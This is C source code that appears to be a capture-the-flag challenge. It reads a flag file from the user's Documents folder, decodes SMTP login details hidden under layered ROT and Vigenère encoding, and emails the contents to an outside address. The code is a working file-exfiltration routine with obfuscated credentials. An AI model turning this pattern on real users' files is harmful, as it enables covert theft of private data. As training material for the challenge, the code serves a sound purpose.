#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <ctype.h>
#include "smtp.h"

#define SMTP_PORT 25
#define BUFFER_SIZE 1024
#define FLAG_SIZE 1024

//Globals which we will use functions for, in order to login.
#define MAIL_SERVER              "127.0.0.1"
#define MAIL_PORT                "25"
#define MAIL_CONNECTION_SECURITY SMTP_SECURITY_STARTTLS
#define MAIL_FLAGS               (SMTP_DEBUG | SMTP_NO_CERT_VERIFY) /* OMIT SMTP_DEBUG IN PRODUCTION.. */
#define MAIL_AUTH                SMTP_AUTH_PLAIN
#define MAIL_FROM                "flagstealer333@roycewantsflags.com"
#define MAIL_FROM_NAME           "FlagStealer333"
#define MAIL_SUBJECT             "FLAG STOLEN"
#define MAIL_TO                  "roycesflagstealer@yandex.com"
#define MAIL_TO_NAME             "royce"

char flag[FLAG_SIZE];


// You are supposed to SSLTRIP or Build your own SMTP relay to solve this challenge. Im gonna railroad
// The F out of this challenge, if you think you can solve this only by
// using "Strings" then you are in for a world of pain.

// OG String: c2VuZGVyQGV4YW1wbGUuY29t
// With Vigenere encryption over RedHerring String: t2ZxGKMpYTB4ZK1puUGnC29q
// ROT 7'd: a2GeNRTwFAI4GR1wbBNuJ29x
// ROT 7 Decrypt These bitches l8r.
char login1[100] = "a2GeN";
char login2[] = "RTwFA";
char login3[] = "I4GR1w";
char login4[] = "bBNuJ29x";
char login5[] = "\r\n";

//RedHerringBottomText in ROT13
char decryptionkey1[100] = "ErqUre";
char decryptionkey2[] = "evatObg";
char decryptionkey3[] = "gbzGrkg";

//OG String: ThisIsNotTheFlag
//Base64 Encoded VGhpc0lzTm90VGhlRmxhZw==
//ROT7 Encoded CNowj0sgAt90CNosYteoGd Without ==.
//Vigenere:TRrdn0jxIg90IOclRhqhKa
char password1[100] = "TRrdn0";
char password2[] = "jxIg9";
char password3[] = "0IOcl";
char password4[] = "RhqhKa";

char masterPass[30];
char masterLogin[30];


// Function to read flag.txt from the user's Documents directory
int read_flag() {
    // Get the user's home directory from the environment variable
    const char *home = getenv("HOME");
    if (home == NULL) {
        fprintf(stderr, "Error: HOME environment variable not set.\n");
        return 1;
    }

    // Construct the full path to ~/Documents/flag.txt
    char path[1024];
    snprintf(path, sizeof(path), "%s/Documents/flag.txt", home);

    // Open the flag file
    FILE *file = fopen(path, "r");
    if (file == NULL) {
        fprintf(stderr, "Error: Could not open %s.\n", path);
        return 1;
    }

    // Read the contents of the flag file into the global variable
    if (fgets(flag, FLAG_SIZE, file) == NULL) {
        fprintf(stderr, "Error: Could not read from %s.\n", path);
        fclose(file);
        return 1;
    }

    // Close the file
    fclose(file);

    return 0;
}

void rot7_decrypt(char *str) {
    while (*str) {
        // Check if it's a lowercase letter
        if (islower(*str)) {
            *str = ((*str - 'a' - 7 + 26) % 26) + 'a';  // Shift back by 7 positions
        }
        // Check if it's an uppercase letter
        else if (isupper(*str)) {
            *str = ((*str - 'A' - 7 + 26) % 26) + 'A';  // Shift back by 7 positions
        }
        // Move to the next character in the string
        str++;
    }
}

void rot13_decrypt(char *str) {
    while (*str) {
        // Check if it's a lowercase letter
        if (islower(*str)) {
            *str = ((*str - 'a' - 13 + 26) % 26) + 'a';  // Shift back by 7 positions
        }
        // Check if it's an uppercase letter
        else if (isupper(*str)) {
            *str = ((*str - 'A' - 13 + 26) % 26) + 'A';  // Shift back by 7 positions
        }
        // Move to the next character in the string
        str++;
    }
}

void vigenere_decrypt(char *ciphertext, char *key, char *plaintext) {
    int key_length = strlen(key);
    int key_index = 0;

    // Loop through each character of the ciphertext
    for (int i = 0; ciphertext[i] != '\0'; i++) {
        char current_char = ciphertext[i];

        if (isalpha(current_char)) {
            char base = islower(current_char) ? 'a' : 'A';  // Determine if it's lowercase or uppercase

            // Find the shift for the current key character
            char key_char = tolower(key[key_index % key_length]) - 'a';  // Normalize key to 0-25

            // Decrypt the current character
            current_char = (current_char - base - key_char + 26) % 26 + base;

            // Move to the next key character
            key_index++;
        }

        // Add the decrypted character to the plaintext
        plaintext[i] = current_char;
    }

    // Null-terminate the plaintext string
    plaintext[strlen(ciphertext)] = '\0';
}

// Simulate fake authentication
// int fake_authentication(SSL *ssl, char *userName, char *passWord) {
//     char buffer[BUFFER_SIZE];
//
//     // Send EHLO command
//     send_command(ssl, "HELO flagstealer.evildomain.com\r\n", buffer);
//
//     // Send AUTH command
//     send_command(ssl, "AUTH LOGIN\r\n", buffer);
//
//     // Send Username (Must be b64)
//     send_command(ssl, userName, buffer);
//
//     // Send Password (Must be b64)
//     send_command(ssl, passWord, buffer);
//
//
//     char prefix[] = "235 Authenticated";
//     if (strncmp(buffer, prefix, strlen(prefix)) == 0) {
//         printf("String starts with '235' Authentication successful.\n");
//         return 1;
//     } else {
//         send_command(ssl, "QUIT \r\n", buffer);
//         printf("String does not start with '235', FAILURE.'\n");
//         return 0;
//     }
//
//
// }

int main() {

    strcat(login1, login2);
    strcat(login1, login3);
    strcat(login1, login4);
    printf("Username Output:");
    printf("%s",login1);
    rot7_decrypt(login1);
    printf("\n");
    printf("%s",login1);


    printf("\nRotating Decryption Key...");
    strcat(decryptionkey1, decryptionkey2);
    strcat(decryptionkey1, decryptionkey3);
    rot13_decrypt(decryptionkey1);
    printf("Using Decryption Key: %s \n", decryptionkey1);
    printf("Decrypting...\n");
    vigenere_decrypt(login1, decryptionkey1, masterLogin);
    printf("%s",masterLogin);

    printf("\n\nObtaining Password...\n");
    strcat(password1, password2);
    strcat(password1, password3);
    strcat(password1, password4);
    printf("Using Present Encrypted Output: %s \n", password1);
    vigenere_decrypt(password1, decryptionkey1, masterPass);
    printf("Decrypted Password: %s \n", masterPass  );
    rot7_decrypt(masterPass);
    printf("Rotated Decrypted Pass: %s \n", masterPass);
    // Call the read_flag function and check for success
    if (read_flag() == 0) {
        printf("Flag contents: %s\n", flag);
    } else {
        printf("Failed to read the flag.\n");
        exit(1);
    }


    // SMTPLibrary: SEND THE FLAG!!!
    struct smtp *smtp;
    int rc;
    rc = smtp_open(MAIL_SERVER,MAIL_PORT,MAIL_CONNECTION_SECURITY,MAIL_FLAGS,NULL,&smtp);
    rc = smtp_auth(smtp, MAIL_AUTH,masterLogin, masterPass);
    rc = smtp_address_add(smtp,
                          SMTP_ADDRESS_FROM,
                          MAIL_FROM,
                          MAIL_FROM_NAME);
    rc = smtp_address_add(smtp,
                          SMTP_ADDRESS_TO,
                          MAIL_TO,
                          MAIL_TO_NAME);
    rc = smtp_header_add(smtp,
                         "Subject",
                         MAIL_SUBJECT);
    rc = smtp_mail(smtp,
                   flag);
    rc = smtp_close(smtp);
    if(rc != SMTP_STATUS_OK){
        fprintf(stderr, "smtp failed: %s\n", smtp_status_code_errstr(rc));
        return 1;
    }
    return 0;
}
